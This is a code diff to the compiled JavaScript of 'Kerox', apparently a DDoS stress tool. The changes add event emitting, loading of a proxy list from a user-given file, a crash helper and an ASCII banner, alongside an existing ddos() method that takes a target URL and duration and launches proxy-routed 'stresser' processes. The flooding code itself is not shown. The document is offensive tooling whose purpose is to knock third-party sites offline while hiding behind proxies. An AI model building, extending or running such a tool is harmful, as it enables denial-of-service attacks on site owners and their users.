@@ -30,6 +30,7 @@ exports.Kerox = void 0;
 const child_process_1 = require("child_process");
 const path_1 = __importDefault(require("path"));
 const http = __importStar(require("http"));
+const fs_1 = __importDefault(require("fs"));
 require("overpaint.js");
 const Utils_1 = require("../utils/Utils");
 const PacketType_1 = require("../enums/PacketType");
@@ -42,14 +43,22 @@ const LogType_1 = require("../enums/LogType");
 const Log_1 = require("../types/Log");
 const LogManager_1 = require("./LogManager");
 const ProgressBar_1 = require("./ProgressBar");
-class Kerox {
+const node_events_1 = __importDefault(require("node:events"));
+class Kerox extends node_events_1.default {
+    emit(event, ...args) { return super.emit(event, ...args); }
+    on(event, listener) { return super.on(event, listener); }
+    once(event, listener) { return super.once(event, listener); }
+    off(event, listener) { return super.off(event, listener); }
     set _status(value) {
         var _a, _b;
         this.status = (_a = value[0]) !== null && _a !== void 0 ? _a : Status_1.Status.Unknown;
         this.info = (_b = value[1]) !== null && _b !== void 0 ? _b : Status_2.Info.Unknown;
+        if (this.status === Status_1.Status.Idle)
+            this.emit('idle');
     }
     // ===== Constructor =====
     constructor(options) {
+        super();
         // ===== Status =====
         this.status = Status_1.Status.Unknown;
         this.info = Status_2.Info.Unknown;
@@ -70,6 +79,7 @@ class Kerox {
             refreshRate: 5,
             useProxies: false,
             validateProxies: true,
+            proxyFilePath: undefined,
         };
         if (typeof options === 'object') {
             Object.assign(this.options, options);
@@ -78,11 +88,29 @@ class Kerox {
         this.initialize();
     }
     // ========== Initialization =====================================================================
+    crash(message = 'An error occurred.') {
+        this.logs._info(message._Red);
+        this.logs._info('Stopping Kerox...'._Red._bold);
+        setTimeout(process.exit, 1000);
+    }
     initialize() {
         this.stats.disable();
-        this.useLocalProxies();
-        if (this.options.validateProxies)
-            this.validateProxies(5000);
+        if (this.options.useProxies) {
+            if (!this.options.proxyFilePath) {
+                return this.crash('Proxy file path is missing.');
+            }
+            else if (!fs_1.default.existsSync(this.options.proxyFilePath)) {
+                return this.crash('Proxy file not found.');
+            }
+            else {
+                this.proxies = (0, Utils_1.parseProxies)(fs_1.default.readFileSync(this.options.proxyFilePath, 'utf8').split('\n'));
+                if (this.options.validateProxies)
+                    this.validateProxies();
+            }
+        }
+        else {
+            this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
+        }
     }
     stopStressers() {
         this.stressers.forEach(stresser => stresser.kill());
@@ -165,18 +193,13 @@ class Kerox {
     }
     // ========== Proxies ===============================================================================
     /**
-     * Reads the proxies from the file and saves them to the proxies array.
-     */
-    useLocalProxies() {
-        let rawProxies = (0, Utils_1.getStatic)('proxies.txt').split('\n');
-        this.proxies = (0, Utils_1.parseProxies)(rawProxies);
-    }
-    /**
      * Starts a stresser to validate the proxies and keep only the working ones.
      */
     validateProxies(timeout = 5000) {
-        if (!this.options.useProxies)
-            return void this.logs._info('Skipping proxy validation.'._dim);
+        if (!this.options.validateProxies) {
+            this.logs._info('Skipping proxy validation.'._dim);
+            return;
+        }
         // set status
         this._status = [Status_1.Status.Busy, Status_2.Info.ValidatingProxies];
         this.resetStats();
@@ -196,13 +219,12 @@ class Kerox {
             if (packet.type === PacketType_1.PacketType.Done) {
                 let rawProxies = (0, Utils_1.getStatic)('valid_proxies.txt').split('\n');
                 let validProxies = (0, Utils_1.parseProxies)(rawProxies);
-                this.logs._info(`Found ${validProxies.length} valid proxies`);
                 if (validProxies.length > 0) {
+                    this.logs._info(`Found ${validProxies.length} valid proxies`);
                     this.proxies = validProxies;
                 }
                 else {
-                    this.logs._info('Stopping Kerox...'._Red._bold);
-                    setTimeout(process.exit, 1000);
+                    return this.crash('No valid proxies found.');
                 }
                 this._status = [Status_1.Status.Idle, Status_2.Info.Unknown];
             }
@@ -268,10 +290,11 @@ class Kerox {
      * @param target The target url
      */
     ddos(options) {
+        this.logs._info(options.target);
         if (!(0, DDoS_1.isDDoSDuration)(options.duration))
-            return void this.logs._info(`Invalid duration.`._Red);
+            return this.crash('Invalid duration.');
         if (this.status === Status_1.Status.Busy)
-            return void this.logs._info(`Kerox is ${this.status}. ${this.info}`._Red);
+            return this.crash(`Kerox is ${this.status}. ${this.info}`);
         this._status = [Status_1.Status.Busy, Status_2.Info.Stressing];
         this.stopStressers();
         this.ddosOptions = options;
@@ -323,5 +346,10 @@ class Kerox {
 }
 exports.Kerox = Kerox;
 // ===== Static =====
-Kerox.header = (0, Utils_1.getStatic)('header.txt')._RebeccaPurple;
+Kerox.header = `\r  _  __                  
+       \r | |/ /
+       \r | ' / ___ _ __ _____  __
+       \r |  < / _ \\ '__/ _ \\ \\/ /
+       \r | . \\  __/ | | (_) >  <
+       \r |_|\\_\\___|_|  \\___/_/\\_\\`._RebeccaPurple;
 //# sourceMappingURL=Kerox.js.map
